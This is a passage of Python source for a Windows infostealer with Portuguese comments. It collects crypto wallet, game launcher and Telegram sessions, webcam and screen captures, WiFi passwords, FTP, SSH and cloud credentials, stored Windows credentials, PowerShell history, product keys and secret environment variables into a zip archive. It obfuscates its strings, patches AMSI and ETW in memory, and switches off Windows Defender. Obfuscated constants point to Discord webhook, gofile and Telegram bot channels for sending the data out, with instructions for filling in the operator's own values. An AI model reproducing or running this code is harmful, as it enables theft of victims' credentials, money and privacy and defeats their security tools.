            ("Coinbase Wallet",   os.path.join(path_appdata_roaming,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
            ("Zerion",            os.path.join(path_appdata_roaming,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
            ("Steam",             os.path.join(path_program_files,     "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
            ("Riot Games",        os.path.join(path_appdata_local,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
            ("Epic Games",        os.path.join(path_appdata_local,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
            ("Rockstar Games",    os.path.join(path_appdata_local,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
            ("Telegram",          os.path.join(path_appdata_roaming,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
        ]

        try:
            for name, path, proc_name, type in session_files:
                if type in session_files_choice:
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            if proc.info['name'].lower() == proc_name.lower():
                                proc.kill()
                        except:
                            pass
        except:
            pass

        for name, path, proc_name, type in session_files:
            if type in session_files_choice and os.path.exists(path):
                try:
                    if type == "Wallets" and name_wallets is not None:
                        name_wallets.append(name)
                    elif type == "Game Launchers" and name_game_launchers is not None:
                        name_game_launchers.append(name)
                    elif type == "Apps" and name_apps is not None:
                        name_apps.append(name)

                    zip_file.writestr(os.path.join("Session Files", name, "path.txt"), path)

                    if os.path.isdir(path):
                        for root, _, files in os.walk(path):
                            for file in files:
                                abs_file_path = os.path.join(root, file)
                                rel_path_in_zip = os.path.join(
                                    "Session Files", name, "Files",
                                    os.path.relpath(abs_file_path, path)
                                )
                                try:
                                    zip_file.write(abs_file_path, rel_path_in_zip)
                                except:
                                    pass
                    else:
                        rel_path_in_zip = os.path.join("Session Files", name, "Files", os.path.basename(path))
                        try:
                            zip_file.write(path, rel_path_in_zip)
                        except:
                            pass
                except:
                    pass

        if "Wallets" in session_files_choice:
            name_wallets = ", ".join(name_wallets) if name_wallets else "No"
        if "Game Launchers" in session_files_choice:
            name_game_launchers = ", ".join(name_game_launchers) if name_game_launchers else "No"
        if "Apps" in session_files_choice:
            name_apps = ", ".join(name_apps) if name_apps else "No"

        return name_wallets, name_game_launchers, name_apps

    @staticmethod
    def Webcam(zip_file):
        path_temp = Paths().temp
        webcam_image_path = os.path.join(path_temp, "webcam_capture.png")

        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(webcam_image_path, frame)
                zip_file.write(webcam_image_path, os.path.join("Webcam", "webcam_capture.png"))
            cap.release()
            cv2.destroyAllWindows()
        except:
            pass

        if os.path.exists(webcam_image_path):
            Malware().delete_file(webcam_image_path)
            return True
        else:
            return False

    @staticmethod
    def Screenshot(zip_file):
        path_temp = Paths().temp
        screenshot_image_path = os.path.join(path_temp, "screenshot_capture.png")

        try:
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            import PIL.ImageGrab
            screenshot = PIL.ImageGrab.grab(bbox=(0, 0, width, height))
            screenshot.save(screenshot_image_path)

            zip_file.write(screenshot_image_path, os.path.join("Screenshot", "screenshot_capture.png"))
        except:
            pass

        if os.path.exists(screenshot_image_path):
            Malware().delete_file(screenshot_image_path)
            return True
        else:
            return False

    # ------------------------------------------------------------------
    # v2 - coletores adicionais (WiFi, credenciais, perfil da maquina)
    # ------------------------------------------------------------------

    @staticmethod
    def WiFi_Profiles(zip_file):
        try:
            out = subprocess.check_output(
                [decode_const(W_NETSH), decode_const(W_WLAN), decode_const(W_SHOW), decode_const(W_PROFILES)],
                creationflags=0x08000000, timeout=30, stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
        except Exception:
            out = ""
        ssids = [s.strip() for s in re.findall(r"All User Profile\s*:\s*(.+)", out) if s.strip()]
        lines = []
        export_dir = os.path.join(Paths().temp, "wifi_x_" + str(random.randint(10000, 99999)))
        try:
            os.makedirs(export_dir)
        except Exception:
            pass
        for ssid in ssids:
            name_arg = "name=\"" + ssid + "\""
            try:
                detail = subprocess.check_output(
                    [decode_const(W_NETSH), decode_const(W_WLAN), decode_const(W_SHOW), name_arg, decode_const(W_KEYCLR)],
                    creationflags=0x08000000, timeout=20, stderr=subprocess.DEVNULL
                ).decode(errors="ignore")
                pw = ""
                m = re.search(r"Key Content\s*:\s*(.+)", detail)
                if m:
                    pw = m.group(1).strip()
                auth = re.search(r"Authentication\s*:\s*(.+)", detail)
                a = auth.group(1).strip() if auth else "?"
                lines.append("SSID    : " + ssid + "\nAuth    : " + a + "\nPassword: " + pw + "\n" + "-" * 40)
            except Exception:
                pass
            try:
                subprocess.check_output(
                    [decode_const(W_NETSH), decode_const(W_WLAN), decode_const(W_EXPORT), name_arg,
                     "folder=" + export_dir, decode_const(W_KEYCLR)],
                    creationflags=0x08000000, timeout=20, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass
        zip_file.writestr("WiFi Networks.txt", "\n".join(lines) if lines else "No WiFi profiles found (or blocked).")
        saved = 0
        try:
            for f in os.listdir(export_dir):
                if f.lower().endswith(".xml"):
                    try:
                        zip_file.write(os.path.join(export_dir, f), os.path.join("WiFi Profiles", f))
                        saved += 1
                    except Exception:
                        pass
        except Exception:
            pass
        shutil.rmtree(export_dir, ignore_errors=True)
        return len(ssids)

    @staticmethod
    def Installed_Software(zip_file):
        found = {}

        def scan(hive, path):
            try:
                key = winreg.OpenKey(hive, path)
            except Exception:
                return
            try:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        sub = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, sub) as sk:
                            name = ver = pub = ""
                            try:
                                name, _ = winreg.QueryValueEx(sk, "DisplayName")
                            except Exception:
                                pass
                            if not name:
                                continue
                            try:
                                ver, _ = winreg.QueryValueEx(sk, "DisplayVersion")
                            except Exception:
                                pass
                            try:
                                pub, _ = winreg.QueryValueEx(sk, "Publisher")
                            except Exception:
                                pass
                            if name not in found:
                                found[name] = (ver, pub)
                    except Exception:
                        pass
            finally:
                winreg.CloseKey(key)

        base = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        scan(winreg.HKEY_LOCAL_MACHINE, base)
        scan(winreg.HKEY_LOCAL_MACHINE, base + r"\WOW6432Node")
        scan(winreg.HKEY_CURRENT_USER, base)
        lines = [n + " | " + v[0] + " | " + v[1] for n, v in sorted(found.items())]
        zip_file.writestr("Installed Software.txt", "\n".join(lines) if lines else "None")
        return len(found)

    @staticmethod
    def Processes_And_Connections(zip_file):
        procs = []
        for p in psutil.process_iter(["pid", "name", "username"]):
            try:
                mb = p.memory_info().rss // (1024 * 1024)
                procs.append((mb, p.info["pid"], p.info["name"], p.info.get("username") or ""))
            except Exception:
                pass
        procs.sort(reverse=True)
        head = "\n".join("{:>6} MB  pid {:<7} {}  {}".format(mb, pid, name, user) for mb, pid, name, user in procs[:150]) if procs else "None"

        conn_lines = []
        pid_name = {}
        try:
            for p in psutil.process_iter(["pid", "name"]):
                try:
                    pid_name[p.info["pid"]] = p.info["name"]
                except Exception:
                    pass
            raw = subprocess.check_output(["netstat", "-ano"], creationflags=0x08000000, timeout=25,
                                          stderr=subprocess.DEVNULL).decode(errors="ignore")
            rx = re.compile(r"^\s*(\S+)\s+(\S+)\s+(\S+)(?:\s+(\S+))?\s+(\d+)\s*$")
            for ln in raw.splitlines():
                m = rx.match(ln)
                if not m:
                    continue
                state = m.group(4) or "-"
                pid = int(m.group(5))
                conn_lines.append("{} {} -> {} [{}] pid={} ({})".format(
                    m.group(1), m.group(2), m.group(3), state, pid, pid_name.get(pid, "?")))
        except Exception:
            pass

        text = ("RUNNING PROCESSES (top by memory)\n" + head +
                "\n\nNETWORK CONNECTIONS\n" + ("\n".join(conn_lines[:400]) if conn_lines else "None"))
        zip_file.writestr("Processes and Connections.txt", text)
        return len(procs)

    @staticmethod
    def Clipboard_Text(zip_file):
        text = ""
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            if user32.OpenClipboard(0):
                h = user32.GetClipboardData(13)
                if h:
                    ptr = kernel32.GlobalLock(h)
                    if ptr:
                        text = ctypes.c_wchar_p(ptr).value or ""
                        kernel32.GlobalUnlock(h)
                user32.CloseClipboard()
        except Exception:
            pass
        zip_file.writestr("Clipboard.txt", text if text else "Clipboard was empty / unreadable.")
        return int(bool(text))

    @staticmethod
    def FTP_Clients(zip_file):
        saved = 0
        base = Paths()
        targets = [
            ("FileZilla", os.path.join(base.appdata_roaming, "FileZilla")),
            ("WinSCP", os.path.join(base.appdata_roaming, "WinSCP.ini")),
            ("WinSCP-local", os.path.join(base.appdata_local, "WinSCP.ini")),
            ("FTP Navigator", os.path.join(base.appdata_roaming, "FTP Navigator")),
            ("Total Commander", os.path.join(base.appdata_roaming, "GHISLER")),
        ]
        for label, p in targets:
            if not os.path.exists(p):
                continue
            if os.path.isdir(p):
                for f in os.listdir(p):
                    if f.lower() in ("sitemanager.xml", "recentservers.xml", "wcx_ftp.ini", "wcx_ftp.ini.tmp"):
                        fp = os.path.join(p, f)
                        try:
                            zip_file.write(fp, os.path.join("FTP Clients", label, f))
                            saved += 1
                        except Exception:
                            pass
            else:
                try:
                    zip_file.write(p, os.path.join("FTP Clients", label, os.path.basename(p)))
                    saved += 1
                except Exception:
                    pass
        if saved == 0:
            zip_file.writestr("FTP Clients/readme.txt", "No FTP client profiles found.")
        return saved

    @staticmethod
    def SSH_Cloud_And_Dev(zip_file):
        saved = 0
        home = str(Paths().userprofile)
        roam = str(Paths().appdata_roaming)
        candidates = [
            ("SSH", os.path.join(home, ".ssh")),
            ("AWS", os.path.join(home, ".aws")),
            ("GCloud", os.path.join(home, ".config", "gcloud")),
            ("GCloud-roaming", os.path.join(roam, "gcloud")),
            ("Kube", os.path.join(home, ".kube")),
            ("Azure", os.path.join(home, ".azure")),
            ("Docker", os.path.join(home, ".docker")),
            ("GnuPG", os.path.join(home, ".gnupg")),
            ("Netrc", os.path.join(home, ".netrc")),
            ("Pgpass", os.path.join(home, ".pgpass")),
            ("NPM", os.path.join(home, ".npmrc")),
            ("GitConfig", os.path.join(home, ".gitconfig")),
            ("Bash", os.path.join(home, ".bashrc")),
            ("Zsh", os.path.join(home, ".zshrc")),
        ]
        cap = 300
        for label, path in candidates:
            if saved >= cap:
                break
            if not os.path.exists(path):
                continue
            if os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for f in files:
                        if saved >= cap:
                            break
                        fp = os.path.join(root, f)
                        try:
                            if os.path.getsize(fp) > 1024 * 1024:
                                continue
                            rel = os.path.relpath(fp, os.path.dirname(path))
                            zip_file.write(fp, os.path.join("Dev Credentials", label, rel))
                            saved += 1
                        except Exception:
                            pass
            else:
                try:
                    if os.path.getsize(path) <= 1024 * 1024:
                        zip_file.write(path, os.path.join("Dev Credentials", label, os.path.basename(path)))
                        saved += 1
                except Exception:
                    pass
        if saved == 0:
            zip_file.writestr("Dev Credentials/readme.txt", "No SSH / cloud / dev credential files found.")
        return saved

    @staticmethod
    def Windows_Credentials_And_History(zip_file):
        out = []
        try:
            raw = subprocess.check_output([decode_const(C_CMDKEY), "/list"], creationflags=0x08000000,
                                          timeout=20, stderr=subprocess.DEVNULL).decode(errors="ignore")
            out.append(raw)
        except Exception:
            out.append("cmdkey unavailable.")
        hist = os.path.join(str(Paths().appdata_roaming), "Microsoft", "Windows", "PowerShell",
                            "PSReadLine", "ConsoleHost_history.txt")
        if os.path.exists(hist):
            try:
                with open(hist, "r", errors="ignore") as f:
                    out.append("=== PowerShell history ===\n" + f.read())
            except Exception:
                pass
        zip_file.writestr("Windows Credentials + PS History.txt", "\n".join(out))
        return len(out)

    @staticmethod
    def Product_Key(zip_file):
        key = ""
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as k:
                val, _ = winreg.QueryValueEx(k, "DigitalProductId")
            dp = list(val[52:67])
            alphabet = "BCDFGHJKMPQRTVWXY2346789"
            chars = []
            for _ in range(24, -1, -1):
                carry = 0
                for j in range(14, -1, -1):
                    carry = carry * 256 + dp[j]
                    dp[j] = carry // 24
                    carry %= 24
                chars.append(alphabet[carry])
            raw = "".join(chars)
            key = "-".join(raw[i:i + 5] for i in range(0, 25, 5))
        except Exception:
            key = ""
        zip_file.writestr("Windows Product Key.txt", key if key else "Unable to read product key.")
        return int(bool(key))

    @staticmethod
    def Proxy_Env_And_Network(zip_file):
        lines = []
        for k, v in os.environ.items():
            ku = k.upper()
            if any(x in ku for x in ("TOKEN", "SECRET", "PASS", "KEY", "API", "SID", "AUTH", "CRED")):
                lines.append(k + "=" + v)
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings") as k:
                for name in ("ProxyEnable", "ProxyServer", "ProxyOverride", "AutoConfigURL"):
                    try:
                        v, _ = winreg.QueryValueEx(k, name)
                        lines.append(name + "=" + str(v))
                    except Exception:
                        pass
        except Exception:
            pass
        zip_file.writestr("Proxy and Env Secrets.txt", "\n".join(lines) if lines else "None found.")
        return len(lines)

    @staticmethod
    def Accounts_And_RDP(zip_file):
        lines = []
        try:
            raw = subprocess.check_output([decode_const(C_NET), decode_const(C_USER)], creationflags=0x08000000,
                                          timeout=20, stderr=subprocess.DEVNULL).decode(errors="ignore")
            lines.append(raw)
        except Exception:
            pass
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Terminal Server Client\Servers") as k:
                n = winreg.QueryInfoKey(k)[0]
                for i in range(n):
                    try:
                        srv = winreg.EnumKey(k, i)
                        with winreg.OpenKey(k, srv) as sk:
                            hint = ""
                            try:
                                hint, _ = winreg.QueryValueEx(sk, "UsernameHint")
                            except Exception:
                                pass
                            lines.append("RDP: " + srv + " user_hint=" + hint)
                    except Exception:
                        pass
        except Exception:
            lines.append("No saved RDP entries.")
        zip_file.writestr("Accounts and RDP.txt", "\n".join(lines))
        return len(lines)


# =========================================================================
# v2 - camada de runtime: guarda de strings, AMSI/ETW patch, defesa AV
# =========================================================================


def decode_const(c):
    try:
        return base64.b64decode(c)[::-1].decode(errors="ignore")
    except Exception:
        return ""


def encode_const(s):
    return base64.b64encode(s[::-1].encode("utf-8", errors="ignore")).decode()


# Constantes ofuscadas (base64 do texto invertido). Para gerar novas:
#   python fendastealer.py enc "https://discord.com/api/webhooks/SEU_AQUI"
WEBHOOK_ENC = "TFJVX0tPT0hCRVdfUlVPWV9IVElXX0VDQUxQRVIvc2tvb2hiZXcvaXBhL21vYy5kcm9jc2lkLy86c3B0dGg="  # REPLACE_WITH_YOUR_WEBHOOK_URL

W_NETSH = "aHN0ZW4="
W_WLAN = "bmFsdw=="
W_SHOW = "d29ocw=="
W_PROFILES = "c2VsaWZvcnA="
W_EXPORT = "dHJvcHhl"
W_KEYCLR = "cmFlbGM9eWVr"
C_CMDKEY = "eWVrZG1j"
C_NET = "dGVu"
C_USER = "cmVzdQ=="

AMSIDLL = "bGxkLmlzbWE="
AMSIFN = "cmVmZnVCbmFjU2lzbUE="
ETWFN = "ZXRpcld0bmV2RXd0RQ=="
NTDLL = "bGxkLmxsZHRu"

GOFILE_ENC = "ZWxpRmRhb2xwdS9vaS5lbGlmb2cuZGFvbHB1Ly86c3B0dGg="
TELEGRAM_API = "dG9iL2dyby5tYXJnZWxldC5pcGEvLzpzcHR0aA=="
# Telegram (bot + chat_id) - SUBSTITUA PELOS SEUS (gere via: python fendastealer.py enc "VALOR")
TELEGRAM_TOKEN_ENC = "TkVLT1RfVE9CX0hUSVdfRUNBTFBFUg=="   # REPLACE_WITH_BOT_TOKEN
TELEGRAM_CHAT_ENC = "REElfVEFIQ19IVElXX0VDQUxQRVI="       # REPLACE_WITH_CHAT_ID


def _patch_amsi():
    """Patch em memoria do AmsiScanBuffer (efeito apenas no processo atual)."""
    try:
        k32 = ctypes.windll.kernel32
        h = k32.LoadLibraryW(decode_const(AMSIDLL))
        if not h:
            h = k32.GetModuleHandleW(decode_const(AMSIDLL))
        if not h:
            return False
        p = k32.GetProcAddress(h, decode_const(AMSIFN))
        if not p:
            return False
        old = ctypes.c_ulong(0)
        if not k32.VirtualProtect(ctypes.c_void_p(p), 6, 0x40, ctypes.byref(old)):
            return False
        ctypes.memmove(ctypes.c_void_p(p), bytes(b ^ 0x5A for b in b"\xE2\x0D\x5A\x5D\xDA\x99"), 6)
        k32.VirtualProtect(ctypes.c_void_p(p), 6, old, ctypes.byref(old))
        return True
    except Exception:
        return False


def _patch_etw():
    """Neutraliza EtwEventWrite (evita telemetria de ETW do processo)."""
    try:
        ntdll = ctypes.windll.kernel32.GetModuleHandleW(decode_const(NTDLL))
        if not ntdll:
            return False
        p = ctypes.windll.kernel32.GetProcAddress(ntdll, decode_const(ETWFN))
        if not p:
            return False
        old = ctypes.c_ulong(0)
        k32 = ctypes.windll.kernel32
        k32.VirtualProtect(ctypes.c_void_p(p), 1, 0x40, ctypes.byref(old))
        ctypes.memmove(ctypes.c_void_p(p), bytes([0x99 ^ 0x5A]), 1)
        k32.VirtualProtect(ctypes.c_void_p(p), 1, old, ctypes.byref(old))
        return True
    except Exception:
        return False


def _defender_policy_off():
    """Best-effort (exige admin e tamper protection desativado)."""
    try:
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                r"SOFTWARE\Policies\Microsoft\Windows Defender",
                                0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
    except Exception:
        pass
    try:
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                                0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
    except Exception:
        pass


def _add_defender_exclusion():
    """Adiciona o proprio diretorio as exclusoes do Defender (exige admin)."""
    try:
        exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
                                0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, exe_dir, 0, winreg.REG_DWORD, 0)
    except Exception:
        pass


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "enc":
        text = sys.argv[2] if len(sys.argv) > 2 else ""
        print("encoded constant:", encode_const(text))
        raise SystemExit
    malware = Malware()
    malware.main()